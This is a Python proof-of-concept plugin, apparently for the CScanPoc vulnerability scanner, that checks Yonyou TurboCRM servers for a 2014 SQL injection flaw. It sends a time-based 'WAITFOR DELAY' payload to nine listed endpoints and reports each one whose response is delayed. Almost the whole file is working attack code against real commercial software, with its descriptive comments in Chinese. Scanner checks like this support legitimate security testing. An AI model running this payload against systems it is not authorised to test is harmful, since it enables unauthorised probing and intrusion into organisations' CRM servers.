# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import time
import re


class Vuln(ABVuln):
    vuln_id = 'Yonyou_0051'  # 平台漏洞编号，留空
    name = '用友TruboCRM管理系统 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-11-18'  # 漏洞公布时间
    desc = '''
        用友是国内著名的内容管理系统之一，包括协同管理系统、用友NC、用友U8等
        用友TruboCRM管理系统，多出存在SQL注入漏洞：
        background/festivalremind.php?ID=1',
        background/smsstatusreport.php?ID=1',
        background/onlinemeetingstatus.php?ID=1',
        background/sendsms.php?ID=1',
        pub/bgtaskreq.php?svr=1',
        login/forgetpswd.php?orgcode=admin&loginname=admin',
        background/recievesms.php?ID=1',
        webservice/service.php?class=WS_System&orgcode=1',
        background/festivalremind.php?ID=99999',
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=083458'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Yonyou(用友)'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '07ad5515-0c5d-472a-b7e3-a42f866cf392'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-25'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # refer     :  http://www.wooyun.org/bugs/wooyun-2010-083458
            # resefer     :  http://www.wooyun.org/bugs/wooyun-2010-083452
            hh = hackhttp.hackhttp()
            arg = self.target
            payloads = [
                '/background/festivalremind.php?ID=1',
                '/background/smsstatusreport.php?ID=1',
                '/background/onlinemeetingstatus.php?ID=1',
                '/background/sendsms.php?ID=1',
                '/pub/bgtaskreq.php?svr=1',
                '/login/forgetpswd.php?orgcode=admin&loginname=admin',
                '/background/recievesms.php?ID=1',
                '/webservice/service.php?class=WS_System&orgcode=1',
                '/background/festivalremind.php?ID=99999',
            ]
            for payload in payloads:
                url = arg + payload
                poc = url + ";%20WAITFOR%20DELAY%20%270:0:5%27--"
                time0 = time.time()
                code, head, res, errcode, _ = hh.http(url)
                time1 = time.time()
                code, head, res, errcode, _ = hh.http(poc)
                time2 = time.time()

                if ((time2 - time1) - (time1 - time0)) >= 4:
                    #security_hole(url + '   sql injection!')
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞，漏洞地址为{url}'.format(
                        target=self.target, name=self.vuln.name, url=url))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
